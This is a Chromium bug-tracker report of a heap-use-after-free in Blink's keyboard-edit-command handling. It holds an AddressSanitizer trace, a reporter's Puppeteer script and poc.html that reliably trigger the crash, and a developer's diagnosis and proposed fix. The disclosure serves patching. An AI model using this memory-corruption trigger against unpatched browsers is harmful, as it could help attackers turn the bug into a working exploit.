# Security: heap-use-after-free in blink::WebString::WebString

| Field | Value |
|-------|-------|
| **Issue ID** | [40063314](https://issues.chromium.org/issues/40063314) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Input |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | st...@gmail.com |
| **Assignee** | dt...@chromium.org |
| **Created** | 2023-03-01 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

[TBD]

**VERSION**  

Chrome Version: 113.0.5623.0  

Operating System: Windows 11

**REPRODUCTION CASE**  

[TBD]

# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION** Type of crash: tab Crash State:

==11928==ERROR: AddressSanitizer: heap-use-after-free on address 0x1215b164bd18 at pc 0x7ffd786b060d bp 0x0056581fd7d0 sp 0x0056581fd818  

READ of size 8 at 0x1215b164bd18 thread T0  

==11928==WARNING: Failed to use and restart external symbolizer!  

==11928==\*\*\* WARNING: Failed to initialize DbgHelp! \*\*\*  

==11928==\*\*\* Most likely this means that the app is already \*\*\*  

==11928==\*\*\* using DbgHelp, possibly with incompatible flags. \*\*\*  

==11928==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  

==11928==\*\*\* or produce wrong results. \*\*\*  

#0 0x7ffd786b060c in blink::WebString::WebString C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\exported\web\_string.cc:53  

#1 0x7ffd7b421c8d in blink::WebFrameWidgetImpl::HandleCurrentKeyboardEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\frame\web\_frame\_widget\_impl.cc:3215  

#2 0x7ffd84b386e8 in blink::Editor::HandleKeyboardEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\editing\editor\_key\_bindings.cc:110  

#3 0x7ffd7ffcb976 in blink::KeyboardEventManager::DefaultKeyboardEventHandler C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\input\keyboard\_event\_manager.cc:381  

#4 0x7ffd7b982a0e in blink::Node::DefaultEventHandler C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\dom\node.cc:2975  

#5 0x7ffd7b886d64 in blink::Element::DefaultEventHandler C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\dom\element.cc:5016  

#6 0x7ffd7bbd6827 in blink::HTMLElement::DefaultEventHandler C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\html\html\_element.cc:2730  

#7 0x7ffd808ecf33 in blink::HTMLLabelElement::DefaultEventHandler C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\html\forms\html\_label\_element.cc:224  

#8 0x7ffd7feae0ba in blink::EventDispatcher::DispatchEventPostProcess C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\dom\events\event\_dispatcher.cc:406  

#9 0x7ffd7feab54d in blink::EventDispatcher::Dispatch C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\dom\events\event\_dispatcher.cc:264  

#10 0x7ffd7fea9763 in blink::EventDispatcher::DispatchEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\dom\events\event\_dispatcher.cc:74  

#11 0x7ffd7ffca6a3 in blink::KeyboardEventManager::KeyEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\input\keyboard\_event\_manager.cc:324  

#12 0x7ffd7b402601 in blink::WebFrameWidgetImpl::HandleKeyEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\frame\web\_frame\_widget\_impl.cc:734  

#13 0x7ffd7f650d11 in blink::WidgetEventHandler::HandleInputEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\input\widget\_event\_handler.cc:106  

#14 0x7ffd7b41aac3 in blink::WebFrameWidgetImpl::HandleInputEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\frame\web\_frame\_widget\_impl.cc:2648  

#15 0x7ffd7f6b3df3 in blink::WidgetBaseInputHandler::HandleInputEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\input\widget\_base\_input\_handler.cc:436  

#16 0x7ffd7f656e9a in blink::WidgetInputHandlerManager::HandleInputEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\input\widget\_input\_handler\_manager.cc:320  

#17 0x7ffd7f6a0089 in blink::MainThreadEventQueue::HandleEventOnMainThread C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\input\main\_thread\_event\_queue.cc:733  

#18 0x7ffd7f6a13f8 in blink::QueuedWebInputEvent::Dispatch C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\input\main\_thread\_event\_queue.cc:170  

#19 0x7ffd7f69e385 in blink::MainThreadEventQueue::DispatchEvents C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\input\main\_thread\_event\_queue.cc:512  

#20 0x7ffd7f6a591b in base::internal::Invoker<base::internal::BindState<void (blink::MainThreadEventQueue::\*)(),scoped\_refptr[blink::MainThreadEventQueue](javascript:void(0);) >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:989  

#21 0x7ffd75c0db4a in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task\_annotator.cc:162  

#22 0x7ffd7907d058 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:490  

#23 0x7ffd7907bb13 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:340  

#24 0x7ffd7909d3f3 in base::MessagePumpDefault::Run C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_default.cc:48  

#25 0x7ffd7907f9d7 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:649  

#26 0x7ffd75c86311 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run\_loop.cc:140  

#27 0x7ffd788da6f9 in content::RendererMain C:\b\s\w\ir\cache\builder\src\content\renderer\renderer\_main.cc:336  

#28 0x7ffd74409a4a in content::RunOtherNamedProcessTypeMain C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:783  

#29 0x7ffd7440c7e3 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:1154  

#30 0x7ffd74407524 in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content\_main.cc:324  

#31 0x7ffd74408154 in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content\_main.cc:341  

#32 0x7ffd68911699 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome\_main.cc:190  

#33 0x7ff76bb66378 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main\_dll\_loader\_win.cc:166  

#34 0x7ff76bb62bb1 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome\_exe\_main\_win.cc:390  

#35 0x7ff76bf9109b in \_\_scrt\_common\_main\_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe\_common.inl:288  

#36 0x7ffe8bf926bc in BaseThreadInitThunk+0x1c (C:\WINDOWS\System32\KERNEL32.DLL+0x1800126bc)  

#37 0x7ffe8d98dfb7 in RtlUserThreadStart+0x27 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18005dfb7)

0x1215b164bd18 is located 152 bytes inside of 3336-byte region [0x1215b164bc80,0x1215b164c988)  

freed by thread T0 here:  

#0 0x7ff76bc1ee9d in free C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_malloc\_win.cpp:82  

#1 0x7ffd7b425a52 in blink::WebFrameWidgetImpl::SetEditCommandsForNextKeyEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\core\frame\web\_frame\_widget\_impl.cc:3507  

#2 0x7ffd7f5ed8cb in blink::WidgetBase::SetEditCommandsForNextKeyEvent C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\widget\_base.cc:1308  

#3 0x7ffd8467d701 in base::internal::Invoker<base::internal::BindState<void (blink::WidgetBase::\*)(WTF::Vector<mojo::InlinedStructPtr[blink::mojom::blink::EditCommand](javascript:void(0);),0,WTF::PartitionAllocator>),base::WeakPtr[blink::WidgetBase](javascript:void(0);),WTF::Vector<mojo::InlinedStructPtr[blink::mojom::blink::EditCommand](javascript:void(0);),0,WTF::PartitionAllocator> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:989  

#4 0x7ffd8467c262 in blink::`anonymous namespace'::RunClosureIfNotSwappedOut C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\widget\input\widget_input_handler_impl.cc:34 #5 0x7ffd846815db in base::internal::Invoker<base::internal::BindState<void (\*)(base::WeakPtr<blink::WidgetBase>, base::OnceCallback<void ()>),base::WeakPtr<blink::WidgetBase>,base::OnceCallback<void ()> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:989 #6 0x7ffd7f6a5301 in blink::`anonymous namespace'::QueuedClosure::Dispatch C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\input\main\_thread\_event\_queue.cc:40  

#7 0x7ffd7f69f94e in blink::MainThreadEventQueue::DispatchRafAlignedInput C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\input\main\_thread\_event\_queue.cc:620  

#8 0x7ffd7f5e756a in blink::WidgetBase::BeginMainFrame C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\widget\_base.cc:896  

#9 0x7ffd7c68155b in cc::ProxyMain::BeginMainFrame C:\b\s\w\ir\cache\builder\src\cc\trees\proxy\_main.cc:266  

#10 0x7ffd8192da9c in base::internal::Invoker<base::internal::BindState<void (cc::ProxyMain::\*)(std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState,std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >),base::WeakPtr[cc::ProxyMain](javascript:void(0);),std::Cr::unique\_ptr<cc::BeginMainFrameAndCommitState,std::Cr::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:989  

#11 0x7ffd75c0db4a in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task\_annotator.cc:162  

#12 0x7ffd7907d058 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:490  

#13 0x7ffd7907bb13 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:340  

#14 0x7ffd7909d3f3 in base::MessagePumpDefault::Run C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_default.cc:48  

#15 0x7ffd7907fc28 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:646  

#16 0x7ffd75c86311 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run\_loop.cc:140  

#17 0x7ffd785a3ebb in content::`anonymous namespace'::NestedMessageLoopRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\child\blink_platform_impl.cc:88 #18 0x7ffd7b8f63a3 in blink::ClientMessageLoopAdapter::RunLoop C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\exported\web_dev_tools_agent_impl.cc:224 #19 0x7ffd7b9234bc in blink::WebViewImpl::Show C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\exported\web_view_impl.cc:3045 #20 0x7ffd8056bbc7 in blink::ChromeClientImpl::Show C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\page\chrome_client_impl.cc:370 #21 0x7ffd7f705b8d in blink::CreateNewWindow C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\page\create_window.cc:375 #22 0x7ffd7b442276 in blink::FrameTree::FindOrCreateFrameForNavigation C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\page\frame_tree.cc:217 #23 0x7ffd7f4ceecd in blink::FormSubmission::Create C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\form_submission.cc:354 #24 0x7ffd7fd5bbe1 in blink::HTMLFormElement::ScheduleFormSubmission C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\forms\html_form_element.cc:466 #25 0x7ffd6c931df9 in v8::internal::FunctionCallbackArguments::Call C:\b\s\w\ir\cache\builder\src\v8\src\api\api-arguments-inl.h:146 #26 0x7ffd6c92f4b1 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-api.cc:113  

#27 0x7ffd6c92d047 in v8::internal::Builtin\_Impl\_HandleApiCall C:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-api.cc:148

previously allocated by thread T10 here:  

#0 0x7ff76bc1ef9d in malloc C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_malloc\_win.cpp:98  

#1 0x7ffd74a26b5b in partition\_alloc::PartitionRoot<1>::Alloc C:\b\s\w\ir\cache\builder\src\base\allocator\partition\_allocator\partition\_root.h:2218  

#2 0x7ffd7385096d in WTF::Vector<mojo::InlinedStructPtr[blink::mojom::blink::EditCommand](javascript:void(0);),0,WTF::PartitionAllocator>::reserve C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\wtf\vector.h:1817  

#3 0x7ffd73850797 in mojo::ArrayTraits<WTF::Vector<mojo::InlinedStructPtr[blink::mojom::blink::EditCommand](javascript:void(0);),0,WTF::PartitionAllocator> >::Resize C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\array\_traits\_wtf\_vector.h:51  

#4 0x7ffd7384f918 in mojo::internal::ArraySerializer<mojo::ArrayDataView[blink::mojom::EditCommandDataView](javascript:void(0);),WTF::Vector<mojo::InlinedStructPtr[blink::mojom::blink::EditCommand](javascript:void(0);),0,WTF::PartitionAllocator>,mojo::internal::ArrayIterator<mojo::ArrayTraits<WTF::Vector<mojo::InlinedStructPtr[blink::mojom::blink::EditCommand](javascript:void(0);),0,WTF::PartitionAllocator> >,WTF::Vector<mojo::InlinedStructPtr[blink::mojom::blink::EditCommand](javascript:void(0);),0,WTF::PartitionAllocator>,0>,void>::DeserializeElements C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\array\_serialization.h:355  

#5 0x7ffd738488a7 in blink::mojom::blink::WidgetInputHandlerStubDispatch::Accept C:\b\s\w\ir\cache\builder\src\out\Release\_x64\gen\third\_party\blink\public\mojom\input\input\_handler.mojom-blink.cc:7138  

#6 0x7ffd75ed9cfa in mojo::InterfaceEndpointClient::HandleValidatedMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface\_endpoint\_client.cc:1007  

#7 0x7ffd791cec68 in mojo::MessageDispatcher::Accept C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message\_dispatcher.cc:43  

#8 0x7ffd75edf6e7 in mojo::InterfaceEndpointClient::HandleIncomingMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface\_endpoint\_client.cc:694  

#9 0x7ffd75ecb930 in mojo::internal::MultiplexRouter::ProcessIncomingMessage C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex\_router.cc:1096  

#10 0x7ffd75eca718 in mojo::internal::MultiplexRouter::Accept C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex\_router.cc:710  

#11 0x7ffd791cec68 in mojo::MessageDispatcher::Accept C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message\_dispatcher.cc:43  

#12 0x7ffd75ef0040 in mojo::Connector::DispatchMessageW C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:550  

#13 0x7ffd75ef19cc in mojo::Connector::ReadAllAvailableMessages C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:607  

#14 0x7ffd75ef3984 in base::internal::Invoker<base::internal::BindState<void (mojo::Connector::\*)(unsigned int),base::internal::UnretainedWrapper[mojo::Connector,base::unretained\_traits::MayNotDangle,0](javascript:void(0);) >,void (unsigned int)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:1002  

#15 0x7ffd6c1e143d in base::RepeatingCallback<void (unsigned int)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:333  

#16 0x7ffd6c1e1244 in base::internal::Invoker<base::internal::BindState<void (\*)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),base::RepeatingCallback<void (unsigned int)> >,void (unsigned int, const mojo::HandleSignalsState &)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:1002  

#17 0x7ffd75f1cd24 in base::RepeatingCallback<void (unsigned int, const mojo::HandleSignalsState &)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:333  

#18 0x7ffd75f1c840 in mojo::SimpleWatcher::OnHandleReady C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple\_watcher.cc:278  

#19 0x7ffd75f1db72 in base::internal::Invoker<base::internal::BindState<void (mojo::SimpleWatcher::\*)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr[mojo::SimpleWatcher](javascript:void(0);),int,unsigned int,mojo::HandleSignalsState>,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind\_internal.h:989  

#20 0x7ffd75c0db4a in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task\_annotator.cc:162  

#21 0x7ffd7907d058 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:490  

#22 0x7ffd7907bb13 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:340  

#23 0x7ffd7909d3f3 in base::MessagePumpDefault::Run C:\b\s\w\ir\cache\builder\src\base\message\_loop\message\_pump\_default.cc:48  

#24 0x7ffd7907f9d7 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run C:\b\s\w\ir\cache\builder\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:649  

#25 0x7ffd75c86311 in base::RunLoop::Run C:\b\s\w\ir\cache\builder\src\base\run\_loop.cc:140  

#26 0x7ffd73b467ff in blink::scheduler::NonMainThreadImpl::SimpleThreadImpl::Run C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\scheduler\worker\non\_main\_thread\_impl.cc:169  

#27 0x7ffd75b07b21 in base::`anonymous namespace'::ThreadFunc C:\b\s\w\ir\cache\builder\src\base\threading\platform\_thread\_win.cc:133

Thread T10 created by T0 here:  

#0 0x7ff76bc14482 in \_\_asan\_wrap\_CreateThread C:\b\s\w\ir\cache\builder\src\third\_party\llvm\compiler-rt\lib\asan\asan\_win.cpp:146  

#1 0x7ffd75b0691f in base::`anonymous namespace'::CreateThreadInternal C:\b\s\w\ir\cache\builder\src\base\threading\platform\_thread\_win.cc:198  

#2 0x7ffd75bb27c9 in base::SimpleThread::StartAsync C:\b\s\w\ir\cache\builder\src\base\threading\simple\_thread.cc:54  

#3 0x7ffd73acd2ad in blink::Thread::CreateAndSetCompositorThread C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\scheduler\common\thread.cc:88  

#4 0x7ffd7c203ecb in content::RenderThreadImpl::InitializeCompositorThread C:\b\s\w\ir\cache\builder\src\content\renderer\render\_thread\_impl.cc:863  

#5 0x7ffd7c1ffa6f in content::RenderThreadImpl::InitializeWebKit C:\b\s\w\ir\cache\builder\src\content\renderer\render\_thread\_impl.cc:901  

#6 0x7ffd7c1fc42e in content::RenderThreadImpl::Init C:\b\s\w\ir\cache\builder\src\content\renderer\render\_thread\_impl.cc:619  

#7 0x7ffd7c1fefb3 in content::RenderThreadImpl::RenderThreadImpl C:\b\s\w\ir\cache\builder\src\content\renderer\render\_thread\_impl.cc:568  

#8 0x7ffd788da17c in content::RendererMain C:\b\s\w\ir\cache\builder\src\content\renderer\renderer\_main.cc:282  

#9 0x7ffd74409a4a in content::RunOtherNamedProcessTypeMain C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:783  

#10 0x7ffd7440c7e3 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content\_main\_runner\_impl.cc:1154  

#11 0x7ffd74407524 in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content\_main.cc:324  

#12 0x7ffd74408154 in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content\_main.cc:341  

#13 0x7ffd68911699 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome\_main.cc:190  

#14 0x7ff76bb66378 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main\_dll\_loader\_win.cc:166  

#15 0x7ff76bb62bb1 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome\_exe\_main\_win.cc:390  

#16 0x7ff76bf9109b in \_\_scrt\_common\_main\_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe\_common.inl:288  

#17 0x7ffe8bf926bc in BaseThreadInitThunk+0x1c (C:\WINDOWS\System32\KERNEL32.DLL+0x1800126bc)  

#18 0x7ffe8d98dfb7 in RtlUserThreadStart+0x27 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18005dfb7)

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\exported\web\_string.cc:53 in blink::WebString::WebString  

Shadow bytes around the buggy address:  

0x1215b164ba80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x1215b164bb00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x1215b164bb80: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x1215b164bc00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x1215b164bc80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

=>0x1215b164bd00: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd  

0x1215b164bd80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x1215b164be00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x1215b164be80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x1215b164bf00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x1215b164bf80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb

==11928==ADDITIONAL INFO

==11928==Note: Please include this section with the ASan report.  

Task trace:  

#0 0x7ffd7f69d07f in blink::MainThreadEventQueue::QueueClosure C:\b\s\w\ir\cache\builder\src\third\_party\blink\renderer\platform\widget\input\main\_thread\_event\_queue.cc:465  

#1 0x7ffd75f1d65e in mojo::SimpleWatcher::Context::Notify C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple\_watcher.cc:102  

==11928==END OF ADDITIONAL INFO  

==11928==ABORTING

## Attachments

- [poc.mjs](attachments/poc.mjs) (application/octet-stream, 624 B)
- [poc.webm](attachments/poc.webm) (video/webm, 5.9 MB)
- [asan.log](attachments/asan.log) (text/plain, 20.9 KB)
- [poc.html](attachments/poc.html) (text/plain, 470 B)

## Timeline

### [Deleted User] (2023-03-01)

[Empty comment from Monorail migration]

### es...@chromium.org (2023-03-01)

Labeling as Needs-Feedback until PoC is available

### es...@chromium.org (2023-03-07)

[Empty comment from Monorail migration]

### st...@gmail.com (2023-03-07)

I am still analyzing this and will send a POC soon, but the UAF seems to be caused by repeatedly sending `dispatchKeyEvent` [0] events with multiple commands while the page is navigating/unloading.

chrome.debugger.sendCommand(
    { tabId },
    'Input.dispatchKeyEvent',
    {
        type: 'rawKeyDown',
        key: 'Enter',
        commands: [
            'DeleteToBeginningOfLine',
            'DeleteToEndOfLine',
        ]
    }
);

https://chromedevtools.github.io/devtools-protocol/tot/Input/#method-dispatchKeyEvent



### [Deleted User] (2023-03-07)

Thank you for providing more feedback. Adding the requester to the cc list.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-03-09)

Thank you for the report. At this time, this report does not contain enough demonstrable evidence of exploitability. Based on the information provided, assigning high severity based on the potential of an exploitable UAF in the renderer process. Without a POC or steps to reproduce, we are unable to validate issue or determine exploitability.  
Labeling as FoundIn-Not and Pri-2 given that the speculative nature of the report based on the data provided thus far. 

In an effort of trying to move this along to a resolution (towards a fix or closing as WontFix) assigning to dtapuska@ and cc'ing bokan@ based on stack trace and due to the involvement of main thread event queue. 
Can you please reassign if you are incorrect owners for this issue. 

Potential owners, the security team is unable to reproduce this based on information provided. If you can diagnose and fix this issue based on the information provided, please proceed accordingly. And if this is the case, I (or another security sheriff) will circle back to see if we (collectively) can determine when this issue was introduced (so the FoundIn- can be updated, as this impacts our merge and release processes). 

If this issue cannot be driven toward a fix, it will need to be closed as a WontFix. 

[Monorail components: Blink>Input]

### [Deleted User] (2023-03-10)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-10)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-13)

[Empty comment from Monorail migration]

### st...@gmail.com (2023-03-13)

**VULNERABILITY DETAILS**  

The 'DeleteToBeginningOfLine' and 'DeleteToEndOfLine' rawKeyDown commands sent to a `contenteditable` form that submits after an inner element is removed by the sent commands results in a heap-UAF.

I've made a repro case using puppeteer which triggers the UAF on every try. Tested in 113.0.5647.0.

```
    setInterval(async () => {  
        await page.keyboard.down('Enter', {  
            commands: [  
                'DeleteToBeginningOfLine',  
                'DeleteToEndOfLine',  
            ]  
        });  
    }, 40);  

```

poc.html:

```
<base target="x">  
<form id="form" contenteditable="true">  
    AAAAAAAAAAAAAAAAA  
    <span id="el1"></span>  
</form>  
  
<script>  
    el1.addEventListener('DOMNodeRemovedFromDocument', () => { form.submit() });  
    document.getSelection().selectAllChildren(form);  
</script>  

```

**REPRODUCTION CASE**

1. npm i puppeteer
2. python3 -m http.server --bind 127.0.0.1 8080
3. node poc.mjs

### [Deleted User] (2023-03-15)

dtapuska: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dt...@chromium.org (2023-03-20)

+dcheng, caseq for ideas.

I can "fix" the issue by moving edit_commands_ to be an on stack variable. 
ie..

+  Vector<mojom::blink::EditCommandPtr> edit_commands = std::move(edit_commands_);
+  for (const auto& command : edit_commands) {

at https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/frame/web_frame_widget_impl.cc;l=3281?q=WebFrameWidgetImpl::HandleCurrentK&ss=chromium


This code is getting into reentrancy that doesn't expect it because of devtools.. While we are processing input events (the edit_commands_ vector), we submit a form that causes devtools to go into a nested event loop. Then we process more input in that nested event loop and we end up reassigning the edit_commands_ vector and when the loop continues on the original edit_commands_ vector we get a UAF.



    #1 0x563230719c32 in base::debug::CollectStackTrace(void**, unsigned long) ./../../base/debug/stack_trace_posix.cc:979:7
    #2 0x5632306cbe43 in StackTrace ./../../base/debug/stack_trace.cc:221:12
    #3 0x5632306cbe43 in base::debug::StackTrace::StackTrace() ./../../base/debug/stack_trace.cc:218:28
    #4 0x5632303aee1a in logging::LogMessage::~LogMessage() ./../../base/logging.cc:729:29
    #5 0x5632303b094e in logging::LogMessage::~LogMessage() ./../../base/logging.cc:723:27
    #6 0x563230359ab0 in logging::NotReachedError::~NotReachedError() ./../../base/check.cc:190:3
